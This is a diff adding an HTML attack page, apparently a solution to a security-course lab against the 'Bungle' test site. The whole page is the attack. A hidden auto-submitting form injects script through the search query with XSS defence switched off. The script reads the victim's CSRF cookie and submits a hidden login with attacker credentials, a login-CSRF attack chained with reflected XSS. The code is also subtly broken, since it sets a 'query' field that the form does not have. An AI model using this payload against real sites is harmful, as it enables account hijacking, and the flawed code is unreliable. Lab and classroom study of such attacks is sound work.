@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+    <form id="csrfForm" action="http://bungle-cs461.csl.illinois.edu/search" method="GET" target="hidden-form">
+        <input type="hidden" name="csrfdefense" value="1"/>
+        <input type="hidden" name="xssdefense" value="0"/>
+    </form>
+    <iframe style="display:none" name="hidden-form"></iframe>
+    <script>
+        var form = document.getElementById("csrfForm");
+        form.query.value =  "<iframe style='display:none' name='loginframe'></iframe>" + 
+                            "<form name='loginForm' action='./login' method='POST' target='loginframe'>" + 
+                            "<input type='hidden' name='username' value='attacker'/>" + 
+                            "<input type='hidden' name='password' value='l33th4x'/>" + 
+                            "<input type='hidden' name='csrf_token' value='0'/>" + 
+                            "</form>" + 
+                            "<script>" + 
+                                `function getCookies() {
+                                    let cookies = {};
+                                    document.cookie.split(';').forEach(cookie => {
+                                        let [key, value] = cookie.split('=').map(c => decodeURIComponent(c.trim()));
+                                        cookies[key] = value;
+                                    });
+                                    return cookies;
+                                }
+                                document.getElementsByName('csrf_token')[0].value = getCookies().csrf_token;
+                                document.loginForm.submit();` + 
+                            "</scr"+"ipt>"
+        form.submit();
+    </script>
+
+</body>
+</html>
